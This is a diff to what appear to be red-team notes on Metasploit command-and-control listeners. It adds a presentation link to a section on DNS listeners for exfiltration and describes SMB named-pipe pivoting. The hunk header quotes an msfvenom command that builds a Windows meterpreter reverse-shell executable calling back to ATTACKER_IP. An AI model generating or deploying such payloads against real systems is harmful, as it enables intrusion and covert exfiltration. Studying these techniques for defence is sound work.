@@ -379,7 +379,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=31337 -f exe
 #### DNS Listener 
    - DNS Listeners are a popular technique specifically used in the exfiltration stage where additional infrastructure is normally required to be set up, or at the very least, a Domain Name must be purchased and registered, and a public NS server must be configured. 
    - It is possible to set up DNS C2 operations in Metasploit with the help of additional tools. 
-   - For more information, see this "Meterpreter over DNS" presentation by Alexey Sintsov and Maxim Andreyanov. 
+   - For more information, see this "[`Meterpreter over DNS`](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_SintsovAndreyanov_MeterpreterReverseDNS.pdf)" presentation by Alexey Sintsov and Maxim Andreyanov. 
    - These are often very useful for bypassing Network Proxies.
 #### SMB Listener 
    - Communicating via SMB named pipes is a popular method of choice, especially when dealing with a restricted network; it often enables more flexible pivoting with multiple devices talking to each other and only one device reaching back out over a more common protocol like HTTP/HTTPS. 
